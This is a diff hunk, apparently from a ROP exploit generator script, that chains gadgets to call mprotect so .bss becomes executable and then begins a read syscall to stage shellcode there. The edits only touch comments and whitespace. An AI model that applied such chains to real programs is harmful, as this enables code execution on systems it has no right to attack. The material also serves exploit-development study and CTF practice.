@@ -50,22 +50,21 @@ def rop_exploit(binary_name):
     # We need to align the BSS with the page size
     bss = (bss & 0xfffff000)
     print(f".bss located at {bss:x}")
+
+    # Padding
     exploit = b'\x41' * padding
 
     shellcode_len = stat(sys.argv[3]).st_size
-    
     commands = {"eax" : push_to_reg(0x0000007D,"eax",gadgets,rop),    
                 "ebx" : push_to_reg(bss,"ebx",gadgets,rop),
                 "ecx" : push_to_reg(0x0000800,"ecx",gadgets,rop),
                 "edx" : push_to_reg(0x0000007,"edx",gadgets,rop)}
-
     exploit += schedule(commands)
     exploit += INT80 # int 0x80
 
     print("Made BSS executable")
 
 
-    # BSS is now executable
     # # Read into BSS
     commands = {"eax" : push_to_reg(3,"eax",gadgets,rop),
                 "ebx" : push_to_reg(0,"ebx",gadgets,rop),
